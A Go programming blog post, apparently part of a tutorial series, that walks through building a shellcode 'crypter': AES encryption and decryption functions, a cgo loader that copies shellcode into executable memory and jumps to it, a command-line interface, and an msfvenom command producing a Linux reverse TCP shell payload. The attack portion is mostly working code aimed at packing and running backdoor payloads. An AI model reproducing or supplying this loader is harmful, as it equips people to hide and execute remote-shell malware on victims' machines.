---
layout: post
title: Go进阶16:go语言AES编写shellcode
category: Golang
tags: Go进阶
description: 
keywords: shell-code后门,go黑客,go后门,golang unsafe
date: 2019-04-04T13:19:54+08:00
score: 5.0
coverage: golang_shellcode.jpg
published: true
---

## 1.前言

The goal for this post will be to demonstrate how to write a sort of crypter that will work as a command line utility allowing us to:

Encrypt a file (it’s aimed for shellcode payloads but that’s irrelevant)
Decrypt a file
Run shellcode

## 2.Step One: Encrypt

I choose AES as the cipher. The code looks like this (full source can be found on GitHub):

```go
func Encrypt(key []byte, text []byte) ([]byte, error) {
 // Init Cipher
 block, err := aes.NewCipher(key)
 if err != nil {
   return nil, err
 }
 // Padding
 paddingLen := aes.BlockSize - (len(text) % aes.BlockSize)
 paddingText := bytes.Repeat([]byte{byte(paddingLen)}, paddingLen)
 textWithPadding := append(text, paddingText...)
 // Getting an IV
 ciphertext := make([]byte, aes.BlockSize+len(textWithPadding))
 iv := ciphertext[:aes.BlockSize]
 // Randomness
 if _, err := io.ReadFull(rand.Reader, iv); err != nil {
   return nil, err
 }
 // Actual encryption
 cfbEncrypter := cipher.NewCFBEncrypter(block, iv)
 cfbEncrypter.XORKeyStream(ciphertext[aes.BlockSize:], textWithPadding)
 return ciphertext, nil
}
```

The function just creates an AES cipher, then calculates the padding needed and proceeds to encrypt the payload.

## 3.Step Two: Decrypt

Now we need to implement the reverse function (again, full source code on Github):

```go
func Decrypt(key []byte, text []byte) ([]byte, error) {
  // Init decipher
  block, err := aes.NewCipher(key)
  if err != nil {
    return nil, err
  }
  if (len(text) % aes.BlockSize) != 0 {
    return nil, errors.New("wrong blocksize")
  }
  // Getting the IV
  iv := text[:aes.BlockSize]
  // Actual decryption
  decodedCipherMsg := text[aes.BlockSize:]
  cfbDecrypter := cipher.NewCFBDecrypter(block, iv)
  cfbDecrypter.XORKeyStream(decodedCipherMsg, decodedCipherMsg)
  // Removing Padding
  length := len(decodedCipherMsg)
  paddingLen := int(decodedCipherMsg[length-1])
  result := decodedCipherMsg[:(length - paddingLen)]
  return result, nil
}
```

## 4.Step Three: Run

As we are using Go (which does not allow raw bytes execution by default) and the shellcode provided was written for the C stack we need to find a way to execute C code in Go. This
can be accomplished by using the “C” package and unsafe pointers.

In C we’d do something like this:

```c
fp = (void *)shellcode
fp();
```

While in Go we need to use some tricks. We’ll use the unsafe package a special pointer that will allow us to use unsafe features:

```go
import "unsafe"
func Run(shellcode []byte) {
  ptr := &shellcode[0]
  unsafe.Pointer(ptr)
}
```

Then we add the C package, write our C code as a comment right above the import and use the defined function to execute the unsafe pointer. This will behave as the C code presented
earlier:

```go
/*
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <unistd.h>
void execute(char *shellcode, size_t length) {
  unsigned char *ptr;
  ptr = (unsigned char *) mmap(0, length, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
  memcpy(ptr, shellcode, length);
  ( *(void(*) ()) ptr)();
}
*/
import "C"
import ("unsafe")
func Run(shellcode []byte) {
  ptr := &shellcode[0]
  size := len(shellcode)
  C.execute((*C.char)(unsafe.Pointer(ptr)), (C.size_t)(size))
}
```

Yes, it’s ugly, I know… but you are running unsafe C code inside Go. It should be ugly. Full source code for this package can be found here.

## 5.Step Four: CLI

Now that we have the meaty part ready we’ll need to implement some methods to facilitate the tool usage. I implemented some functions to allow the user to fire the encryption,
decryption and “decrypt & run” routines using various sets of options.

I won’t go into details for this part as it just reads the parameters provided from os.Args[] and determines which function to execute depending on the input. Source code can be
found here.

```bash
gocrypt {action} {key} {file}
Action can be: 
  Encryption:     --encrypt -e encrypt e
  Decryption:     --decrypt -d decrypt d
  Decrypt & Run:  --run     -r run     r
Key: must be 16, 24 or 32 chars long
File: must be a valid path
```

## 6.Step Five: Show

We can get the raw bytes for a reverse TCP shell from Metasploit issuing:

msfvenom -a x64 --platform linux -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 > msfvemonpayload
After that, we can use the payload to test our crypter. It’s show time!
